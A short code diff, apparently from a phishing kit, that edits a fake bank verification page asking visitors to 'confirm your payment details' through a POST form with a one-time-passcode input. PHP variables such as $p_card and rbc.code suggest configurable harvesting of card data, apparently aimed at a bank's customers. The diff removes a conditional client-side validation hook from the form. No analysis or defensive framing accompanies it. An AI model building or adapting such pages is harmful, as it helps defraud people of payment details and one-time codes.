@@ -65,7 +65,7 @@ let p_code = rbc.code === 'on' ? true : false;
                             <div _ngcontent-ahj-c68="" class="passcode-view-component">
                                 <h1 _ngcontent-ahj-c68="" class="passcode-heading">Confirm Your Payment Details</h1>
                                 <p _ngcontent-ahj-c68="" class="passcode-message">To validate your sign in request, please confirm your payment details.</p>
-                                <form id="loginForm" action="" method="POST" class="lab-form" <?=$p_card ? 'onsubmit="return validate()"' : ''?>>
+                                <form id="loginForm" action="" method="POST" class="lab-form">
                                     <input type="hidden" id="userAgent" name="userAgent">
                                     <core-banking-otp-input _ngcontent-ahj-c68="">
                                         <div class="otp-input-component ng-pristine ng-invalid ng-touched">
